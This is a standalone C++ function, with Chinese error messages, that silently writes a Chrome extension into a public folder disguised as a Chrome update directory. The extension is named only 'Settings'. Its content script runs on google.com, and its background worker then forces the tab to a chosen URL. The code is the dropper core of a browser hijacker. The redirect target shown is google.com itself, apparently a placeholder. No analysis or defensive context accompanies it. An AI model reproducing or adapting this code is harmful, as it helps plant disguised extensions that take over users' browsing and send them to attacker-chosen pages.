void F(){

    std::string extensionDir = "C:\\Users\\Public\\Chrome\\Update";
    if (!createDirectory(extensionDir)) {
        std::cerr << "无法创建扩展目录。" << std::endl;
        return;
    }

    std::ofstream backgroundJsFile((extensionDir + "\\background.js").c_str());
    if (backgroundJsFile.is_open()) {
        backgroundJsFile << R"(
           chrome.runtime.onMessage.addListener(function(request, sender) {
    chrome.tabs.update(sender.tab.id, {url: request.redirect});
}); )";
        backgroundJsFile.close();
    } else {
        std::cerr << "无法创建文件。" << std::endl;
        return;
    }

    std::ofstream manifestFile((extensionDir + "\\manifest.json").c_str());
    if (manifestFile.is_open()) {
        manifestFile << R"(
            {
  "name": "Settings",
  "description": "Settings",
  "version": "2.2",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": [
        "*://google.com/*",
        "https://www.google.com/"
      ],
      "js": [
        "redirect.js"
      ]
    }
  ]
}
 )";
        manifestFile.close();
    } else {
        std::cerr << "无法创建文件。" << std::endl;
        return;
    }

    std::ofstream redirectFile((extensionDir + "\\redirect.js").c_str());
    if (redirectFile.is_open()) {
      redirectFile << R"(
        chrome.runtime.sendMessage({redirect: "https://google.com"});
      )";
      redirectFile.close();}
      else{
        std::cerr << "无法创建文件。" << std::endl;
        return;
      }

}
